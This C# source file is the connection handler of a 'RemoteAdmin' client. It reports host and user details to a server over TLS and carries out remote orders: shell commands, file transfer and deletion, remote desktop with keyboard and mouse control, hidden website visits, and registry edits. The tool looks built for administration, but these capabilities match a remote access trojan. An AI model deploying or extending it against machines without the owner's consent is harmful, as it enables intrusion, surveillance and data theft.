using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using RemoteAdmin.Client.Config;
using RemoteAdmin.Client.Handlers;
using RemoteAdmin.Client.Modules;
using RemoteAdmin.Shared;


namespace RemoteAdmin.Client.Networking
{
    public class ConnectionManager
    {
        private static Process? shellProcess;

        static readonly HttpClient PublicIpHttp = new HttpClient(
        new HttpClientHandler { Proxy = null, UseProxy = false })
        {
            Timeout = TimeSpan.FromSeconds(3)
        };

        public static async Task RunClient()
        {
            Console.WriteLine($"Server: {ClientConfig.ServerIP}:{ClientConfig.ServerPort}");
            Console.WriteLine($"Reconnect Delay: {ClientConfig.ReconnectInterval}s");

            var clientCert = RemoteAdmin.Client.Certificates.EmbeddedLoader.LoadClientCertificate();
            var caCert = RemoteAdmin.Client.Certificates.EmbeddedLoader.LoadCaCertificate();

            while (true)
            {
                try
                {
                    using (var tcpClient = new TcpClient())
                    {
                        await tcpClient.ConnectAsync(ClientConfig.ServerIP, ClientConfig.ServerPort);
                        Console.WriteLine("Connected to server!");

                        // Wrap TCP stream in TLS
                        var networkStream = tcpClient.GetStream();
                        var sslStream = await NetworkHelper.CreateClientSslStreamAsync(
                            networkStream, clientCert, caCert, "RemoteAdmin Server");

                        Console.WriteLine("✓ Secure TLS connection established!");
                        
                        var ep = (System.Net.IPEndPoint?)tcpClient.Client.LocalEndPoint;
                        var ip = ep?.Address;
                        if (ip.IsIPv4MappedToIPv6) ip = ip.MapToIPv4();

                        var userAccount = new UserAccount();

                        var clientInfo = new ClientInfoMessage
                        {
                            ComputerName = Environment.MachineName,
                            Username = Environment.UserName,
                            OSVersion = Environment.OSVersion.ToString(),
                            IPAddress = ip.ToString(),
                            PublicIP = await GetPublicIPAsync(),
                            AccountType = userAccount.Type.ToString()
                        };

                        await NetworkHelper.SendMessageAsync(sslStream, clientInfo);
                        Console.WriteLine("Sent client info to server");

                        _ = Task.Run(async () => await ListenForMessages(sslStream));

                        while (tcpClient.Connected)
                        {
                            await Task.Delay(10000);

                            if (tcpClient.Connected)
                            {
                                await NetworkHelper.SendMessageAsync(sslStream, new HeartbeatMessage());
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Connection error: {ex.Message}");
                    Console.WriteLine($"Reconnecting in {ClientConfig.ReconnectInterval} seconds...");
                    await Task.Delay(ClientConfig.ReconnectInterval * 1000);
                }
            }
        }

        static async Task<string> GetPublicIPAsync()
        {
            try
            {
                var urls = new[]
                {
                    "https://api.ipify.org",
                    "https://checkip.amazonaws.com",
                    "https://ifconfig.me/ip"
                };

                foreach (var url in urls)
                {
                    var txt = (await PublicIpHttp.GetStringAsync(url)).Trim();
                    if (IsValidPublicIp(txt))
                        return txt;
                }
            }
            catch { }

            return "Unknown";
        }

        static bool IsValidPublicIp(string s)
        {
            if (!IPAddress.TryParse(s, out var ip)) return false;

            if (ip.IsIPv4MappedToIPv6) ip = ip.MapToIPv4();

            byte[] b = ip.GetAddressBytes();
            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            {
                if (b[0] == 10) return false;
                if (b[0] == 172 && b[1] >= 16 && b[1] <= 31) return false;
                if (b[0] == 192 && b[1] == 168) return false;
                if (b[0] == 127) return false;
                if (b[0] == 169 && b[1] == 254) return false;
            }
            else
            {
                if (IPAddress.IsLoopback(ip)) return false;
                if (ip.IsIPv4MappedToIPv6) return true;
                var prefix = b[0];
                if ((prefix & 0xFE) == 0xFC) return false;
                if (prefix == 0xFE && (b[1] & 0xC0) == 0x80) return false;
                if (prefix == 0xFF) return false;
            }

            return true;
        }

        public static async Task ListenForMessages(Stream stream)
        {
            try
            {
                while (true)
                {
                    var message = await NetworkHelper.ReceiveMessageAsync(stream);

                    if (message == null)
                    {
                        Console.WriteLine("Received null message, connection might be closed");
                        break;
                    }

                    if (message is ShellCommandMessage shellCmd)
                    {
                        Console.WriteLine($"Received shell command ({shellCmd.ShellType}): {shellCmd.Command}");
                        _ = Task.Run(async () => await CommandHandler.HandleShellCommand(stream, shellCmd.Command, shellCmd.ShellType));
                        
                    }
                    else if (message is PowerCommandMessage powerCmd)
                    {
                        Console.WriteLine($"Received power command: {powerCmd.Command}");
                        _ = Task.Run(async () => await CommandHandler.HandlePowerCommand(stream, powerCmd.Command));
                    }
                    else if (message is ProcessListRequestMessage)
                    {
                        Console.WriteLine("Received process list request");
                        _ = Task.Run(async () => await CommandHandler.HandleProcessListRequest(stream));
                    }
                    else if (message is KillProcessMessage killMsg)
                    {
                        Console.WriteLine($"Received kill process request: {killMsg.ProcessName} (PID: {killMsg.ProcessId})");
                        _ = Task.Run(async () => await CommandHandler.HandleKillProcess(stream, killMsg));
                    }
                    else if (message is ServiceListRequestMessage)
                    {
                        Console.WriteLine("Received service list request");
                        _ = Task.Run(async () => await CommandHandler.HandleServiceListRequest(stream));
                    }
                    else if (message is ServiceControlMessage serviceMsg)
                    {
                        Console.WriteLine($"Received service control: {serviceMsg.Action} - {serviceMsg.ServiceName}");
                        _ = Task.Run(async () => await CommandHandler.HandleServiceControl(stream, serviceMsg));
                    }
                    else if (message is DirectoryListRequestMessage dirRequest)
                    {
                        Console.WriteLine($"Received directory list request: {dirRequest.Path}");
                        _ = Task.Run(async () => await FileSystemHandler.HandleDirectoryListRequest(stream, dirRequest));
                        
                    }
                    else if (message is DownloadFileRequestMessage downloadRequest)
                    {
                        Console.WriteLine($"Received download request: {downloadRequest.FilePath}");
                        _ = Task.Run(async () => await FileSystemHandler.HandleDownloadRequest(stream, downloadRequest));
                    }
                    else if (message is UploadFileStartMessage uploadStart)
                    {
                        Console.WriteLine($"Received upload start: {uploadStart.FileName} to {uploadStart.DestinationPath}");
                        string destinationPath = Path.Combine(uploadStart.DestinationPath, uploadStart.FileName);
                        FileSystemHandler.activeUploads[uploadStart.TransferId] = destinationPath;
                        Console.WriteLine($"Will save to: {destinationPath}");
                    }
                    else if (message is FileChunkMessage fileChunk)
                    {
                        Console.WriteLine($"Received file chunk: {fileChunk.FileName} at offset {fileChunk.Offset}");
                        _ = Task.Run(async () => await FileSystemHandler.HandleFileChunk(stream, fileChunk));
                    }
                    else if (message is DeleteFileMessage deleteMsg)
                    {
                        Console.WriteLine($"Received delete request: {deleteMsg.Path}");
                        _ = Task.Run(async () => await FileSystemHandler.HandleDeleteFile(stream, deleteMsg));
                    }
                    else if (message is RenameFileMessage renameMsg)
                    {
                        Console.WriteLine($"Received rename request: {renameMsg.OldPath} -> {renameMsg.NewName}");
                        _ = Task.Run(async () => await FileSystemHandler.HandleRenameFile(stream, renameMsg));
                    }
                    else if (message is CreateDirectoryMessage createDirMsg)
                    {
                        Console.WriteLine($"Received create directory request: {createDirMsg.Path}");
                        _ = Task.Run(async () => await FileSystemHandler.HandleCreateDirectory(stream, createDirMsg));
                    }
                    else if (message is StartRemoteDesktopMessage startDesktop)
                    {
                        Console.WriteLine("Received start remote desktop request");
                        _ = Task.Run(() => RemoteDesktopHandler.HandleStartRemoteDesktop(startDesktop, stream));
                    }
                    else if (message is StopRemoteDesktopMessage)
                    {
                        Console.WriteLine("Received stop remote desktop request");
                        RemoteDesktopHandler.HandleStopRemoteDesktop();
                    }
                    else if (message is MouseInputMessage mouseInput)
                    {
                        _ = Task.Run(() => RemoteDesktopHandler.HandleMouseInput(mouseInput));
                    }
                    else if (message is KeyboardInputMessage keyboardInput)
                    {
                        _ = Task.Run(() => RemoteDesktopHandler.HandleKeyboardInput(keyboardInput));
                    }
                    else if (message is VisitWebsiteMessage visitMsg)
                    {
                        Console.WriteLine($"Received visit website request: {visitMsg.Url} (Hidden: {visitMsg.Hidden})");
                        _ = Task.Run(async () => await WebsiteVisitorHandler.HandleVisitWebsite(stream, visitMsg));
                    }
                    else if (message is SelectMonitorMessage selectMonitor)
                    {
                        Console.WriteLine($"Received select monitor request: Monitor {selectMonitor.MonitorIndex}");
                        RemoteDesktopHandler.HandleSelectMonitor(selectMonitor);
                    }
                    else if (message is OpenRegistryEditorMessage)
                    {
                        Console.WriteLine("Received open registry editor request");
                        _ = Task.Run(async () => await RegistryEditorHandler.HandleOpenRegistryEditor(stream));
                    }
                    else if (message is RegistryEnumerateMessage registryEnumerate)
                    {
                        Console.WriteLine($"Received registry enumerate request: {registryEnumerate.KeyPath}");
                        _ = Task.Run(async () => await RegistryEditorHandler.HandleEnumerateRegistry(stream, registryEnumerate));
                    }
                    else if (message is RegistryCreateKeyMessage registryCreateKey)
                    {
                        Console.WriteLine($"Received registry create key request: {registryCreateKey.ParentPath}\\{registryCreateKey.KeyName}");
                        _ = Task.Run(async () => await RegistryEditorHandler.HandleCreateKey(stream, registryCreateKey));
                    }
                    else if (message is RegistryDeleteKeyMessage registryDeleteKey)
                    {
                        Console.WriteLine($"Received registry delete key request: {registryDeleteKey.KeyPath}");
                        _ = Task.Run(async () => await RegistryEditorHandler.HandleDeleteKey(stream, registryDeleteKey));
                    }
                    else if (message is RegistrySetValueMessage registrySetValue)
                    {
                        Console.WriteLine($"Received registry set value request: {registrySetValue.KeyPath}\\{registrySetValue.ValueName}");
                        _ = Task.Run(async () => await RegistryEditorHandler.HandleSetValue(stream, registrySetValue));
                    }
                    else if (message is RegistryDeleteValueMessage registryDeleteValue)
                    {
                        Console.WriteLine($"Received registry delete value request: {registryDeleteValue.KeyPath}\\{registryDeleteValue.ValueName}");
                        _ = Task.Run(async () => await RegistryEditorHandler.HandleDeleteValue(stream, registryDeleteValue));
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error listening for messages: {ex.Message}");
                Console.WriteLine($"Stack trace: {ex.StackTrace}");
            }
        }
    }
}
